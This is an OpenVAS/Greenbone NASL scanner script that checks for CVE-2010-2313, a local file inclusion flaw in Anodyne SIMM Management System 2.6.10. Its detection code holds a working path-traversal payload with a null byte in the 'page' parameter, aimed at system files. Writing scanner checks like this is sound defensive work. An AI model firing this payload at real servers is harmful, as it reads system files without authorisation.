# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:anodyne-productions:simm_management_system";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901127");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-06-22 14:43:46 +0200 (Tue, 22 Jun 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-2313");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Anodyne SIMM Management System (SMS) <= 2.6.10 LFI Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_anodyne_sms_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("anodyne/sms/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Anodyne SIMM Management System (SMS) is prone to a local file
  inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied
  input via the 'page' parameter to 'index.php' when magic_quotes_gpc is disabled, that allows
  remote attackers to view files and execute local scripts in the context of the webserver.");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to obtain
  potentially sensitive information and to execute arbitrary local scripts in the context of the
  webserver process.");

  script_tag(name:"affected", value:"Anodyne Productions SIMM Management System (SMS) version
  2.6.10 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/59063");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12848/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {
  url = dir + "/index.php?page=../../../../../../../../../../../../../../../" + files[pattern] + "%00";

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
